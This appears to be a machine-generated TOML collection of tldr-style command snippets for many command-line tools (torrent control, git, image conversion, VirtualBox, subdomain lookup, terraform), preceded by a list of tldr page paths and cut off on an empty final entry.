/tmp/tmpl329c0wq/tldr/pages/common/airshare.md
/tmp/tmpl329c0wq/tldr/pages/common/tlmgr-check.md
/tmp/tmpl329c0wq/tldr/pages/common/just.md
/tmp/tmpl329c0wq/tldr/pages/common/git-checkout.md
/tmp/tmpl329c0wq/tldr/pages/common/john.md
/tmp/tmpl329c0wq/tldr/pages/common/mods.md
/tmp/tmpl329c0wq/tldr/pages/common/docker-update.md
/tmp/tmpl329c0wq/tldr/pages/common/docker-build.md
/tmp/tmpl329c0wq/tldr/pages/common/units.md
/tmp/tmpl329c0wq/tldr/pages/common/cs-resolve.md
/tmp/tmpl329c0wq/tldr/pages/common/aws-batch.md
/tmp/tmpl329c0wq/tldr/pages/common/doctum.md
/tmp/tmpl329c0wq/tldr/pages/common/pueue-status.md
/tmp/tmpl329c0wq/tldr/pages/common/az-logout.md
/tmp/tmpl329c0wq/tldr/pages/common/cargo-help.md
/tmp/tmpl329c0wq/tldr/pages/common/eol.md
/tmp/tmpl329c0wq/tldr/pages/common/auditd.md
/tmp/tmpl329c0wq/tldr/pages/common/xmlto.md
/tmp/tmpl329c0wq/tldr/pages/common/vimtutor.md
/tmp/tmpl329c0wq/tldr/pages/common/conda-install.md
/tmp/tmpl329c0wq/tldr/pages/common/nix-shell.md
/tmp/tmpl329c0wq/tldr/pages/common/git-bugreport.md
/tmp/tmpl329c0wq/tldr/pages/common/pass.md
/tmp/tmpl329c0wq/tldr/pages/common/pre-commit.md
/tmp/tmpl329c0wq/tldr/pages/common/zcmp.md
/tmp/tmpl329c0wq/tldr/pages/common/ppmpat.md
/tmp/tmpl329c0wq/tldr/pages/common/gcloud-kms-decrypt.md
/tmp/tmpl329c0wq/tldr/pages/common/masscan.md
/tmp/tmpl329c0wq/tldr/pages/common/polybar-msg.md
/tmp/tmpl329c0wq/tldr/pages/common/aws-route53.md
/tmp/tmpl329c0wq/tldr/pages/common/bird.md
/tmp/tmpl329c0wq/tldr/pages/common/btm.md
/tmp/tmpl329c0wq/tldr/pages/common/zipalign.md
/tmp/tmpl329c0wq/tldr/pages/common/elvish.md
/tmp/tmpl329c0wq/tldr/pages/common/git-replace.md
/tmp/tmpl329c0wq/tldr/pages/common/ldc.md
/tmp/tmpl329c0wq/tldr/pages/common/curl.md
/tmp/tmpl329c0wq/tldr/pages/common/qm-nbdstop.md
/tmp/tmpl329c0wq/tldr/pages/common/dvc-unfreeze.md
/tmp/tmpl329c0wq/tldr/pages/common/dotnet-ef.md
/tmp/tmpl329c0wq/tldr/pages/common/git-ls-tree.md
/tmp/tmpl329c0wq/tldr/pages/common/vboxmanage.md
/tmp/tmpl329c0wq/tldr/pages/common/notmuch.md
/tmp/tmpl329c0wq/tldr/pages/common/dotnet-tool.md
/tmp/tmpl329c0wq/tldr/pages/common/wfuzz.md
/tmp/tmpl329c0wq/tldr/pages/common/satis.md
/tmp/tmpl329c0wq/tldr/pages/common/atrm.md
/tmp/tmpl329c0wq/tldr/pages/common/printenv.md
/tmp/tmpl329c0wq/tldr/pages/common/netstat.md
/tmp/tmpl329c0wq/tldr/pages/common/stolonctl.md
/tmp/tmpl329c0wq/tldr/pages/common/dotnet-add-reference.md
/tmp/tmpl329c0wq/tldr/pages/common/vlc.md
/tmp/tmpl329c0wq/tldr/pages/common/sc_warts2text.md
/tmp/tmpl329c0wq/tldr/pages/common/pgmtofs.md
/tmp/tmpl329c0wq/tldr/pages/common/g++.md
/tmp/tmpl329c0wq/tldr/pages/common/salt-call.md
/tmp/tmpl329c0wq/tldr/pages/common/nudoku.md
/tmp/tmpl329c0wq/tldr/pages/common/ical.md
/tmp/tmpl329c0wq/tldr/pages/common/ppmtoicr.md
/tmp/tmpl329c0wq/tldr/pages/common/cdk.md
/tmp/tmpl329c0wq/tldr/pages/common/kubectl-get.md
/tmp/tmpl329c0wq/tldr/pages/common/devcontainer.md
/tmp/tmpl329c0wq/tldr/pages/common/pveperf.md
/tmp/tmpl329c0wq/tldr/pages/common/afconvert.md
/tmp/tmpl329c0wq/tldr/pages/common/tree.md
/tmp/tmpl329c0wq/tldr/pages/common/wp.md
/tmp/tmpl329c0wq/tldr/pages/common/sf.md
/tmp/tmpl329c0wq/tldr/pages/common/jhat.md
/tmp/tmpl329c0wq/tldr/pages/common/emacsclient.md
/tmp/tmpl329c0wq/tldr/pages/common/git-show-ref.md
/tmp/tmpl329c0wq/tldr/pages/common/mv.md
/tmp/tmpl329c0wq/tldr/pages/common/gcloud.md
/tmp/tmpl329c0wq/tldr/pages/common/sshpass.md
/tmp/tmpl329c0wq/tldr/pages/common/nix-build.md
/tmp/tmpl329c0wq/tldr/pages/common/virsh-pool-autostart.md
/tmp/tmpl329c0wq/tldr/pages/common/pueue-add.md
/tmp/tmpl329c0wq/tldr/pages/common/unar.md
/tmp/tmpl329c0wq/tldr/pages/common/ppmtoppm.md
/tmp/tmpl329c0wq/tldr/pages/common/testssl.md
/tmp/tmpl329c0wq/tldr/pages/common/ppmtobmp.md
/tmp/tmpl329c0wq/tldr/pages/common/mpc.md
/tmp/tmpl329c0wq/tldr/pages/common/speedtest.md
/tmp/tmpl329c0wq/tldr/pages/common/transfersh.md
/tmp/tmpl329c0wq/tldr/pages/common/lzcat.md
/tmp/tmpl329c0wq/tldr/pages/common/grpcurl.md
/tmp/tmpl329c0wq/tldr/pages/common/winicontoppm.md
/tmp/tmpl329c0wq/tldr/pages/common/az-storage-container.md
/tmp/tmpl329c0wq/tldr/pages/common/sc_wartscat.md
/tmp/tmpl329c0wq/tldr/pages/common/asdf.md
/tmp/tmpl329c0wq/tldr/pages/common/cargo-verify-project.md
/tmp/tmpl329c0wq/tldr/pages/common/direnv.md
/tmp/tmpl329c0wq/tldr/pages/common/javadoc.md
/tmp/tmpl329c0wq/tldr/pages/common/starship.md
/tmp/tmpl329c0wq/tldr/pages/common/gitk.md
/tmp/tmpl329c0wq/tldr/pages/common/fossil-init.md
/tmp/tmpl329c0wq/tldr/pages/common/esptool.py.md
/tmp/tmpl329c0wq/tldr/pages/common/zsteg.md
/tmp/tmpl329c0wq/tldr/pages/common/php.md
/tmp/tmpl329c0wq/tldr/pages/common/nix.md
/tmp/tmpl329c0wq/tldr/pages/common/aws-quicksight.md
/tmp/tmpl329c0wq/tldr/pages/common/feroxbuster.md
/tmp/tmpl329c0wq/tldr/pages/common/export.md
/tmp/tmpl329c0wq/tldr/pages/common/rc.md
/tmp/tmpl329c0wq/tldr/pages/common/cradle-elastic.md
/tmp/tmpl329c0wq/tldr/pages/common/charm.md
/tmp/tmpl329c0wq/tldr/pages/common/sd.md
/tmp/tmpl329c0wq/tldr/pages/common/lzmore.md
/tmp/tmpl329c0wq/tldr/pages/common/dd.md
/tmp/tmpl329c0wq/tldr/pages/common/wasm2wat.md
/tmp/tmpl329c0wq/tldr/pages/common/az-storage-table.md
/tmp/tmpl329c0wq/tldr/pages/common/pkill.md
/tmp/tmpl329c0wq/tldr/pages/common/nrm.md
/tmp/tmpl329c0wq/tldr/pages/common/xzegrep.md
/tmp/tmpl329c0wq/tldr/pages/common/pbmtomgr.md
/tmp/tmpl329c0wq/tldr/pages/common/optipng.md
/tmp/tmpl329c0wq/tldr/pages/common/vue-serve.md
/tmp/tmpl329c0wq/tldr/pages/common/identify.md
/tmp/tmpl329c0wq/tldr/pages/common/zotero.md
/tmp/tmpl329c0wq/tldr/pages/common/head.md
/tmp/tmpl329c0wq/tldr/pages/common/rpi-imager.md
/tmp/tmpl329c0wq/tldr/pages/common/hub-browse.md
/tmp/tmpl329c0wq/tldr/pages/common/jf.md
/tmp/tmpl329c0wq/tldr/pages/common/bshell.md
/tmp/tmpl329c0wq/tldr/pages/common/dvc.md
/tmp/tmpl329c0wq/tldr/pages/common/func.md
/tmp/tmpl329c0wq/tldr/pages/common/oc.md
/tmp/tmpl329c0wq/tldr/pages/common/remove-nodeversion.md
/tmp/tmpl329c0wq/tldr/pages/common/travis.md
/tmp/tmpl329c0wq/tldr/pages/common/godoc.md
/tmp/tmpl329c0wq/tldr/pages/common/b3sum.md
/tmp/tmpl329c0wq/tldr/pages/common/ppmtolj.md
/tmp/tmpl329c0wq/tldr/pages/common/accelerate.md
/tmp/tmpl329c0wq/tldr/pages/common/tye.md
[[snippets]]
  description = "Start Flips to create and apply patches interactively"
  command = "flips"
  output = ""

[[snippets]]
  description = "Apply a patch and create a new ROM file"
  command = "flips --apply <patch.bps> <rom.smc> <hack.smc>"
  output = ""

[[snippets]]
  description = "Create a patch from two ROMs"
  command = "flips --create <rom.smc> <hack.smc> <patch.bps>"
  output = ""

[[snippets]]
  description = "Display the name of the root window"
  command = "xprop -root WM_NAME"
  output = ""

[[snippets]]
  description = "Display the window manager hints for a window"
  command = "xprop -name ""<window_name>"" WM_HINTS"
  output = ""

[[snippets]]
  description = "Display the point size of a font"
  command = "xprop -font ""<font_name>"" POINT_SIZE"
  output = ""

[[snippets]]
  description = "Display all the properties of the window with the id 0x200007"
  command = "xprop -id <0x200007>"
  output = ""

[[snippets]]
  description = "Add a torrent file or magnet link to Transmission and download to a specified directory"
  command = "transmission-remote <hostname> -a <torrent|url> -w </path/to/download_directory>"
  output = ""

[[snippets]]
  description = "Change the default download directory"
  command = "transmission-remote <hostname> -w </path/to/download_directory>"
  output = ""

[[snippets]]
  description = "List all torrents"
  command = "transmission-remote <hostname> --list"
  output = ""

[[snippets]]
  description = "Start torrent 1 and 2, stop torrent 3"
  command = "transmission-remote <hostname> -t ""<1,2>"" --start -t <3> --stop"
  output = ""

[[snippets]]
  description = "Remove torrent 1 and 2, and also delete local data for torrent 2"
  command = "transmission-remote <hostname> -t <1> --remove -t <2> --remove-and-delete"
  output = ""

[[snippets]]
  description = "Stop all torrents"
  command = "transmission-remote <hostname> -t <all> --stop"
  output = ""

[[snippets]]
  description = "Move torrents 1-10 and 15-20 to a new directory (which will be created if it does not exist)"
  command = "transmission-remote <hostname> -t ""<1-10,15-20>"" --move </path/to/new_directory>"
  output = ""

[[snippets]]
  description = "Log into a Gitea server"
  command = "tea login add --name ""<name>"" --url ""<url>"" --token ""<token>"""
  output = ""

[[snippets]]
  description = "Display all repositories"
  command = "tea repos ls"
  output = ""

[[snippets]]
  description = "Display a list of issues"
  command = "tea issues ls"
  output = ""

[[snippets]]
  description = "Display a list of issues for a specific repository"
  command = "tea issues ls --repo ""<repository>"""
  output = ""

[[snippets]]
  description = "Create a new issue"
  command = "tea issues create --title ""<title>"" --body ""<body>"""
  output = ""

[[snippets]]
  description = "Display a list of open pull requests"
  command = "tea pulls ls"
  output = ""

[[snippets]]
  description = "Open the current repository in a browser"
  command = "tea open"
  output = ""

[[snippets]]
  description = "Create a project"
  command = "scrapy startproject <project_name>"
  output = ""

[[snippets]]
  description = "Create a spider (in project directory)"
  command = "scrapy genspider <spider_name> <website_domain>"
  output = ""

[[snippets]]
  description = "Edit spider (in project directory)"
  command = "scrapy edit <spider_name>"
  output = ""

[[snippets]]
  description = "Run spider (in project directory)"
  command = "scrapy crawl <spider_name>"
  output = ""

[[snippets]]
  description = "Fetch a webpage as Scrapy sees it and print the source to `stdout`"
  command = "scrapy fetch <url>"
  output = ""

[[snippets]]
  description = "Open a webpage in the default browser as Scrapy sees it (disable JavaScript for extra fidelity)"
  command = "scrapy view <url>"
  output = ""

[[snippets]]
  description = "Open Scrapy shell for URL, which allows interaction with the page source in a Python shell (or IPython if available)"
  command = "scrapy shell <url>"
  output = ""

[[snippets]]
  description = "Run the `command` and print the time measurements to `stdout`"
  command = "time <command>"
  output = ""

[[snippets]]
  description = "Get a snapshot of the device state at a specific path"
  command = "gnmic --address <ip:port> get --path <path>"
  output = ""

[[snippets]]
  description = "Query the device state at multiple paths"
  command = "gnmic -a <ip:port> get --path <path/to/file_or_directory1> --path <path/to/file_or_directory2>"
  output = ""

[[snippets]]
  description = "Query the device state at multiple paths with a common prefix"
  command = "gnmic -a <ip:port> get --prefix <prefix> --path <path/to/file_or_directory1> --path <path/to/file_or_directory2>"
  output = ""

[[snippets]]
  description = "Query the device state and specify response encoding (json_ietf)"
  command = "gnmic -a <ip:port> get --path <path> --encoding json_ietf"
  output = ""

[[snippets]]
  description = "Switch to an existing branch"
  command = "git switch <branch_name>"
  output = ""

[[snippets]]
  description = "Create a new branch and switch to it"
  command = "git switch --create <branch_name>"
  output = ""

[[snippets]]
  description = "Create a new branch based on an existing commit and switch to it"
  command = "git switch --create <branch_name> <commit>"
  output = ""

[[snippets]]
  description = "Switch to the previous branch"
  command = "git switch -"
  output = ""

[[snippets]]
  description = "Switch to a branch and update all submodules to match"
  command = "git switch --recurse-submodules <branch_name>"
  output = ""

[[snippets]]
  description = "Switch to a branch and automatically merge the current branch and any uncommitted changes into it"
  command = "git switch --merge <branch_name>"
  output = ""

[[snippets]]
  description = "Start PHP's built-in web server for the current Yii application"
  command = "php yii <serve>"
  output = ""

[[snippets]]
  description = "Generate a controller, views and related files for the CRUD actions on the specified model class"
  command = "php yii <gii/crud> --modelClass=<ModelName> --controllerClass=<ControllerName>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "php yii <help>"
  output = ""

[[snippets]]
  description = "List available runtimes for a web application"
  command = "az webapp list-runtimes --os-type <windows|linux>"
  output = ""

[[snippets]]
  description = "Create a web application"
  command = "az webapp up --name <name> --location <location> --runtime <runtime>"
  output = ""

[[snippets]]
  description = "List all web applications"
  command = "az webapp list"
  output = ""

[[snippets]]
  description = "Delete a specific web application"
  command = "az webapp delete --name <name> --resource-group <resource_group>"
  output = ""

[[snippets]]
  description = "Convert the image from BT.709 luminance to radiance or sRGB luminance"
  command = "pnmgamma -<bt709tolinear|bt709tosrgb> <path/to/image.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Convert the image from radiance or sRGB luminance to BT.709 luminance"
  command = "pnmgamma -<lineartobt709|srgbtobt709> <path/to/image.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Specify the gamma value used for the gamma transfer function"
  command = "pnmgamma -gamma <value> <path/to/image.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Specify the gamma value used for the gamma transfer function per color component"
  command = "pnmgamma -rgamma <value> -ggamma <value> -bgamma <value> <path/to/image.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Launch the GUI"
  command = "qmmp"
  output = ""

[[snippets]]
  description = "Start or stop the currently playing audio"
  command = "qmmp --play-pause"
  output = ""

[[snippets]]
  description = "Seek [f]or[w]ar[d]s or [b]ack[w]ar[d]s a specific amount of time in seconds"
  command = "qmmp --seek-<fwd|bwd> <time_in_seconds>"
  output = ""

[[snippets]]
  description = "Play the next audio file"
  command = "qmmp --next"
  output = ""

[[snippets]]
  description = "Play the previous audio file"
  command = "qmmp --previous"
  output = ""

[[snippets]]
  description = "Display the current volume"
  command = "qmmp --volume-status"
  output = ""

[[snippets]]
  description = "[inc]rease or [dec]rease the volume of the currently playing audio by 5%"
  command = "qmmp --volume-<inc|dec>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "aws help"
  output = ""

[[snippets]]
  description = "List all available topics"
  command = "aws help topics"
  output = ""

[[snippets]]
  description = "Display help about a specific topic"
  command = "aws help <topic_name>"
  output = ""

[[snippets]]
  description = "List all installed formulae and casks"
  command = "brew list"
  output = ""

[[snippets]]
  description = "List files belonging to an installed formula"
  command = "brew list <formula>"
  output = ""

[[snippets]]
  description = "List artifacts of a cask"
  command = "brew list <cask>"
  output = ""

[[snippets]]
  description = "List only formulae"
  command = "brew list --formula"
  output = ""

[[snippets]]
  description = "List only casks"
  command = "brew list --cask"
  output = ""

[[snippets]]
  description = "Detect unused secrets"
  command = "k8s-unused-secret-detector"
  output = ""

[[snippets]]
  description = "Detect unused secrets in a specific namespace"
  command = "k8s-unused-secret-detector -n <namespace>"
  output = ""

[[snippets]]
  description = "Delete unused secrets in a specific namespace"
  command = "k8s-unused-secret-detector -n <namespace> | kubectl delete secret -n <namespace>"
  output = ""

[[snippets]]
  description = "Add a Git repository as a subtree"
  command = "git subtree add --prefix=<path/to/directory/> --squash <repository_url> <branch_name>"
  output = ""

[[snippets]]
  description = "Update subtree repository to its latest commit"
  command = "git subtree pull --prefix=<path/to/directory/> <repository_url> <branch_name>"
  output = ""

[[snippets]]
  description = "Merge recent changes up to the latest subtree commit into the subtree"
  command = "git subtree merge --prefix=<path/to/directory/> --squash <repository_url> <branch_name>"
  output = ""

[[snippets]]
  description = "Push commits to a subtree repository"
  command = "git subtree push --prefix=<path/to/directory/> <repository_url> <branch_name>"
  output = ""

[[snippets]]
  description = "Extract a new project history from the history of a subtree"
  command = "git subtree split --prefix=<path/to/directory/> <repository_url> -b <branch_name>"
  output = ""

[[snippets]]
  description = "Produce an MPEG-1 stream using the parameter file to specify inputs and outputs"
  command = "ppmtompeg <path/to/parameter_file>"
  output = ""

[[snippets]]
  description = "Encode the GOP with the specified number only"
  command = "ppmtompeg -gop <gop_num> <path/to/parameter_file>"
  output = ""

[[snippets]]
  description = "Specify the first and last frame to encode"
  command = "ppmtompeg -frames <first_frame> <last_frame> <path/to/parameter_file>"
  output = ""

[[snippets]]
  description = "Combine multiple MPEG frames into a single MPEG-1 stream"
  command = "ppmtompeg -combine_frames <path/to/parameter_file>"
  output = ""

[[snippets]]
  description = "Create a backup containing all resources"
  command = "velero backup create <backup_name>"
  output = ""

[[snippets]]
  description = "List all backups"
  command = "velero backup get"
  output = ""

[[snippets]]
  description = "Delete a backup"
  command = "velero backup delete <backup_name>"
  output = ""

[[snippets]]
  description = "Create a weekly backup, each living for 90 days (2160 hours)"
  command = "velero schedule create <schedule_name> --schedules=""<@every 7d>"" --ttl <2160h0m0s>"
  output = ""

[[snippets]]
  description = "Create a restore from the latest successful backup triggered by specific schedule"
  command = "velero restore create --from-schedule <schedule_name>"
  output = ""

[[snippets]]
  description = "View documentation for `Get-NodeInstallLocation`, a tool to get the current Node.js install location"
  command = "tldr get-nodeinstalllocation"
  output = ""

[[snippets]]
  description = "View documentation for `Get-NodeVersions`, a tool to list all available and currently-installed Node.js versions"
  command = "tldr get-nodeversions"
  output = ""

[[snippets]]
  description = "View documentation for `Install-NodeVersion`, a tool to install Node.js runtime versions"
  command = "tldr install-nodeversion"
  output = ""

[[snippets]]
  description = "View documentation for `Remove-NodeVersion`, a tool to uninstall an existing Node.js version"
  command = "tldr remove-nodeversion"
  output = ""

[[snippets]]
  description = "View documentation for `Set-NodeInstallLocation`, a tool to set the Node.js install location"
  command = "tldr set-nodeinstalllocation"
  output = ""

[[snippets]]
  description = "View documentation for `Set-NodeVersion`, a tool to set the default version of Node.js"
  command = "tldr set-nodeversion"
  output = ""

[[snippets]]
  description = "Unregister an existing VM"
  command = "VBoxManage unregistervm <uuid|vm_name>"
  output = ""

[[snippets]]
  description = "Delete hard disk image files, all saved state files, VM logs, and XML VM machine files"
  command = "VBoxManage unregistervm <uuid|vm_name> --delete"
  output = ""

[[snippets]]
  description = "Delete all files from the VM"
  command = "VBoxManage unregistervm <uuid|vm_name> --delete-all"
  output = ""

[[snippets]]
  description = "Create a temporary inbox"
  command = "tmpmail --generate"
  output = ""

[[snippets]]
  description = "List messages and their numeric ID"
  command = "tmpmail"
  output = ""

[[snippets]]
  description = "Display the most recent received email"
  command = "tmpmail --recent"
  output = ""

[[snippets]]
  description = "Open a specific message"
  command = "tmpmail <email_id>"
  output = ""

[[snippets]]
  description = "View email as raw text without HTML tags"
  command = "tmpmail --text"
  output = ""

[[snippets]]
  description = "Open email with a specific browser (default is w3m)"
  command = "tmpmail --browser <browser>"
  output = ""

[[snippets]]
  description = "Download English subtitles for a video"
  command = "subliminal download -l <en> <video.ext>"
  output = ""

[[snippets]]
  description = "Install a given version of node. If the version is already installed, it will be activated"
  command = "n <version>"
  output = ""

[[snippets]]
  description = "Display installed versions and interactively activate one of them"
  command = "n"
  output = ""

[[snippets]]
  description = "Remove a version"
  command = "n rm <version>"
  output = ""

[[snippets]]
  description = "Execute a file with a given version"
  command = "n use <version> <file.js>"
  output = ""

[[snippets]]
  description = "Output binary path for a version"
  command = "n bin <version>"
  output = ""

[[snippets]]
  description = "Find files containing "foo", and print the line matches in context"
  command = "ag <foo>"
  output = ""

[[snippets]]
  description = "Find files containing "foo" in a specific directory"
  command = "ag <foo> <path/to/directory>"
  output = ""

[[snippets]]
  description = "Find files containing "foo", but only [l]ist the filenames"
  command = "ag -l <foo>"
  output = ""

[[snippets]]
  description = "Find files containing "FOO" case-[i]nsensitively, and print [o]nly the match, rather than the whole line"
  command = "ag -i -o <FOO>"
  output = ""

[[snippets]]
  description = "Find "foo" in files with a name matching "bar""
  command = "ag <foo> -G <bar>"
  output = ""

[[snippets]]
  description = "Find files whose contents match a regular expression"
  command = "ag '<^ba(r|z)$>'"
  output = ""

[[snippets]]
  description = "Find files with a name matching "foo""
  command = "ag -g <foo>"
  output = ""

[[snippets]]
  description = "Show all ID3v1 tags of a specific MP3 file"
  command = "mp3info <path/to/file.mp3>"
  output = ""

[[snippets]]
  description = "Edit ID3v1 tags interactively"
  command = "mp3info -i <path/to/file.mp3>"
  output = ""

[[snippets]]
  description = "Set values for ID3v1 tags in a specific MP3 file"
  command = "mp3info -a ""<artist_name>"" -t ""<song_title>"" -l ""<album_title>"" -y <year> -c ""<comment_text>"" <path/to/file.mp3>"
  output = ""

[[snippets]]
  description = "Set the number of the track in the album for a specific MP3 file"
  command = "mp3info -n <track_number> <path/to/file.mp3>"
  output = ""

[[snippets]]
  description = "Print a list of valid genres and their numeric codes"
  command = "mp3info -G"
  output = ""

[[snippets]]
  description = "Set the music genre for a specific MP3 file"
  command = "mp3info -g <genre_number> <path/to/file.mp3>"
  output = ""

[[snippets]]
  description = "Start a shell with all dependencies of a package from nixpkgs available"
  command = "nix develop <nixpkgs#pkg>"
  output = ""

[[snippets]]
  description = "Start a development shell for the default package in a flake in the current directory"
  command = "nix develop"
  output = ""

[[snippets]]
  description = "In that shell, configure and build the sources"
  command = "configurePhase; buildPhase"
  output = ""

[[snippets]]
  description = "Show functions in the current project"
  command = "list functions;"
  output = ""

[[snippets]]
  description = "Create a Java function using a `.jar` resource"
  command = "create function <func_name> as <path.to.package.Func> using '<package.jar>';"
  output = ""

[[snippets]]
  description = "Create a Python function using a `.py` resource"
  command = "create function <func_name> as <script.Func> using '<script.py>';"
  output = ""

[[snippets]]
  description = "Delete a function"
  command = "drop function <func_name>;"
  output = ""

[[snippets]]
  description = "Create a new VM with default settings"
  command = "VBoxManage createvm --name <vm_name>"
  output = ""

[[snippets]]
  description = "Set the base folder where the VM configuration will be stored"
  command = "VBoxManage createvm --name <vm_name> --basefolder <path/to/directory>"
  output = ""

[[snippets]]
  description = "Set the guest OS type (one of `VBoxManage list ostypes`) for the imported VM"
  command = "VBoxManage createvm --name <vm_name> --ostype <ostype>"
  output = ""

[[snippets]]
  description = "Register the created VM in VirtualBox"
  command = "VBoxManage createvm --name <vm_name> --register"
  output = ""

[[snippets]]
  description = "Set the VM to the specified groups"
  command = "VBoxManage createvm --name <vm_name> --group <group1,group2,...>"
  output = ""

[[snippets]]
  description = "Set the Universally Unique Identifier (UUID) of the VM"
  command = "VBoxManage createvm --name <vm_name> --uuid <uuid>"
  output = ""

[[snippets]]
  description = "Set the cipher to use for encryption"
  command = "VBoxManage createvm --name <vm_name> --cipher <AES-128|AES-256>"
  output = ""

[[snippets]]
  description = "Print the code metrics for the specified files"
  command = "mh_metric <path/to/file1.m path/to/file2.m ...>"
  output = ""

[[snippets]]
  description = "Print the code metrics for the specified Octave files"
  command = "mh_metric --octave <path/to/file1.m path/to/file2.m ...>"
  output = ""

[[snippets]]
  description = "Print the code metrics for the specified directory recursively"
  command = "mh_metric <path/to/directory>"
  output = ""

[[snippets]]
  description = "Print the code metrics for the current directory"
  command = "mh_metric"
  output = ""

[[snippets]]
  description = "Print the code metrics report in HTML or JSON format"
  command = "mh_metric --<html|json> <path/to/output_file>"
  output = ""

[[snippets]]
  description = "Convert a PPM image to an ILBM file"
  command = "ppmtoilbm <path/to/file.ppm> > <path/to/file.ilbm>"
  output = ""

[[snippets]]
  description = "Write a maximum of n planes to the ILBM file and produce a HAM/24bit/direct color file if this number is exceeded"
  command = "ppmtoilbm -maxplanes <n> -<hamif|24if|dcif> <path/to/file.ppm> > <path/to/file.ilbm>"
  output = ""

[[snippets]]
  description = "Produce a ILBM file with exactly n planes"
  command = "ppmtoilbm -fixplanes <n> <path/to/file.ppm> > <path/to/file.ilbm>"
  output = ""

[[snippets]]
  description = "Select the compression method to be used"
  command = "ppmtoilbm -<compress|nocompress|savemem> <path/to/file.ppm> > <path/to/file.ilbm>"
  output = ""

[[snippets]]
  description = "Find subdomains for a domain"
  command = "sublist3r --domain <domain_name>"
  output = ""

[[snippets]]
  description = "Find subdomains for a domain, also enabling brute force search"
  command = "sublist3r --domain <domain_name> --bruteforce"
  output = ""

[[snippets]]
  description = "Save the found subdomains to a text file"
  command = "sublist3r --domain <domain_name> --output <path/to/output_file>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "sublist3r --help"
  output = ""

[[snippets]]
  description = "Compile a bison definition file"
  command = "bison <path/to/file.y>"
  output = ""

[[snippets]]
  description = "Compile in debug mode, which causes the resulting parser to write additional information to `stdout`"
  command = "bison --debug <path/to/file.y>"
  output = ""

[[snippets]]
  description = "Specify the output filename"
  command = "bison --output <path/to/output.c> <path/to/file.y>"
  output = ""

[[snippets]]
  description = "Be verbose when compiling"
  command = "bison --verbose"
  output = ""

[[snippets]]
  description = "Compare two files"
  command = "xzdiff <path/to/file1> <path/to/file2>"
  output = ""

[[snippets]]
  description = "Compare two files, showing the differences side by side"
  command = "xzdiff --side-by-side <path/to/file1> <path/to/file2>"
  output = ""

[[snippets]]
  description = "Compare two files and report only that they differ (no details on what is different)"
  command = "xzdiff --brief <path/to/file1> <path/to/file2>"
  output = ""

[[snippets]]
  description = "Compare two files and report when the files are the same"
  command = "xzdiff --report-identical-files <path/to/file1> <path/to/file2>"
  output = ""

[[snippets]]
  description = "Compare two files using paginated results"
  command = "xzdiff --paginate <path/to/file1> <path/to/file2>"
  output = ""

[[snippets]]
  description = "Write test files to a given directory, filling the drive"
  command = "f3write <path/to/mount_point>"
  output = ""

[[snippets]]
  description = "Limit the write speed"
  command = "f3write --max-write-rate=<kb_per_second> <path/to/mount_point>"
  output = ""

[[snippets]]
  description = "Go to the highest-ranked directory that contains "foo" in the name"
  command = "zoxide query <foo>"
  output = ""

[[snippets]]
  description = "Go to the highest-ranked directory that contains "foo" and then "bar""
  command = "zoxide query <foo> <bar>"
  output = ""

[[snippets]]
  description = "Start an interactive directory search (requires `fzf`)"
  command = "zoxide query --interactive"
  output = ""

[[snippets]]
  description = "Add a directory or increment its rank"
  command = "zoxide add <path/to/directory>"
  output = ""

[[snippets]]
  description = "Remove a directory from `zoxide`'s database interactively"
  command = "zoxide remove <path/to/directory> --interactive"
  output = ""

[[snippets]]
  description = "Generate shell configuration for command aliases (`z`, `za`, `zi`, `zq`, `zr`)"
  command = "zoxide init <bash|fish|zsh>"
  output = ""

[[snippets]]
  description = "Convert between image formats"
  command = "magick <path/to/input_image.png> <path/to/output_image.jpg>"
  output = ""

[[snippets]]
  description = "Resize an image, making a new copy"
  command = "magick <path/to/input_image.jpg> -resize <100x100> <path/to/output_image.jpg>"
  output = ""

[[snippets]]
  description = "Create a GIF out of all JPG images in the current directory"
  command = "magick <*.jpg> <path/to/images.gif>"
  output = ""

[[snippets]]
  description = "Create a checkerboard pattern"
  command = "magick -size <640x480> pattern:checkerboard <path/to/checkerboard.png>"
  output = ""

[[snippets]]
  description = "Create a PDF file out of all JPG images in the current directory"
  command = "magick <*.jpg> -adjoin <path/to/file.pdf>"
  output = ""

[[snippets]]
  description = "Format `stdin` as multiple columns"
  command = "ls | git column --mode=<column>"
  output = ""

[[snippets]]
  description = "Format `stdin` as multiple columns with a maximum width of `100`"
  command = "ls | git column --mode=column --width=<100>"
  output = ""

[[snippets]]
  description = "Format `stdin` as multiple columns with a maximum padding of `30`"
  command = "ls | git column --mode=column --padding=<30>"
  output = ""

[[snippets]]
  description = "Ping a specified host using ICMP if the user is allowed to, otherwise using TCP"
  command = "nping <example.com>"
  output = ""

[[snippets]]
  description = "Ping a specified host using ICMP assuming that the user is allowed to do so"
  command = "nping --icmp --privileged <example.com>"
  output = ""

[[snippets]]
  description = "Ping a specified host using UDP"
  command = "nping --udp <example.com>"
  output = ""

[[snippets]]
  description = "Ping a specified host on a given port using TCP"
  command = "nping --tcp --dest-port <443> <example.com>"
  output = ""

[[snippets]]
  description = "Ping a certain number of times"
  command = "nping --count <10> <example.com>"
  output = ""

[[snippets]]
  description = "Wait a certain amount of time between each ping"
  command = "nping --delay <5s> <example.com>"
  output = ""

[[snippets]]
  description = "Send the request over a specified interface"
  command = "nping --interface <eth0> <example.com>"
  output = ""

[[snippets]]
  description = "Set the Reserved/Evil bit in sent packets"
  command = "nping --evil <example.com>"
  output = ""

[[snippets]]
  description = "Format a file to `stdout`, with a custom maximum line length"
  command = "autopep8 <path/to/file.py> --max-line-length <length>"
  output = ""

[[snippets]]
  description = "Format a file, displaying a diff of the changes"
  command = "autopep8 --diff <path/to/file>"
  output = ""

[[snippets]]
  description = "Format a file in-place and save the changes"
  command = "autopep8 --in-place <path/to/file.py>"
  output = ""

[[snippets]]
  description = "Recursively format all files in a directory in-place and save changes"
  command = "autopep8 --in-place --recursive <path/to/directory>"
  output = ""

[[snippets]]
  description = "Get the current Node.js installation directory"
  command = "Get-NodeInstallLocation"
  output = ""

[[snippets]]
  description = "Initialize a new or existing Terraform configuration"
  command = "terraform init"
  output = ""

[[snippets]]
  description = "Verify that the configuration files are syntactically valid"
  command = "terraform validate"
  output = ""

[[snippets]]
